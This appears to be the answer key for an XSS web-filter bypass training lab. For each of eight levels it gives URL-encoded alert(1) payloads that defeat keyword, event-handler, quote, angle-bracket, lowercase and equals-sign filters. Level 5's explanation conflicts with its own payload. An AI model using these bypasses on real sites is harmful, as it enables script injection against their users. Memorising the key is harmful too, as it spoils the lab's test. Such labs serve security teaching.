# waf-bypass — solutions

Classic WAF bypass filters: keyword strip, event strip, quote escape, single-side angle strip, lowercase, equals strip.

### waf-bypass-level1

`/waf-bypass/level1/?query=%3CscrSCRIPTipt%3Ealert(1)%3C/scrSCRIPTipt%3E`

- payload: `<scrSCRIPTipt>alert(1)</scrSCRIPTipt>`
- context: case-insensitive single-pass `script` strip — nested-keyword rejoin

### waf-bypass-level2

`/waf-bypass/level2/?query=%3Cimg%20src=x%20onerror=top%5B%27al%27%2B%27ert%27%5D(1)%3E`

- payload: `<img src=x onerror=top['al'+'ert'](1)>`
- context: alert/confirm/prompt stripped — string concat bypass

### waf-bypass-level3

`/waf-bypass/level3/?query=%22%20autofocus%20o%26%23110%3Bfocus=alert(1)%20x=%22`

- payload: `" autofocus o&#110;focus=alert(1) x="`
- context: angles encoded, `on\w+=` stripped; HTML entity inside attr decodes to `onfocus` after filter

### waf-bypass-level4

`/waf-bypass/level4/?query=%3C/script%3E%3Csvg%20onload=alert(1)%3E`

- payload: `</script><svg onload=alert(1)>`
- context: quotes entity-escaped inside JS string; close script tag entirely

### waf-bypass-level5

`/waf-bypass/level5/?query=%3Csvg%20onload=alert(1)%3E`

- payload: `<svg onload=alert(1)>`
- context: only `<` stripped — defensive stub; no working tag-opening bypass

### waf-bypass-level6

`/waf-bypass/level6/?query=%22%3E%3Csvg%20onload=alert(1)%3E`

- payload: `"><svg onload=alert(1)>`
- context: dual reflection — img src attr breakout fires before body sink

### waf-bypass-level7

`/waf-bypass/level7/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: lowercased then `script` stripped — img bypasses script filter

### waf-bypass-level8

`/waf-bypass/level8/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: `=` stripped — script tag needs none
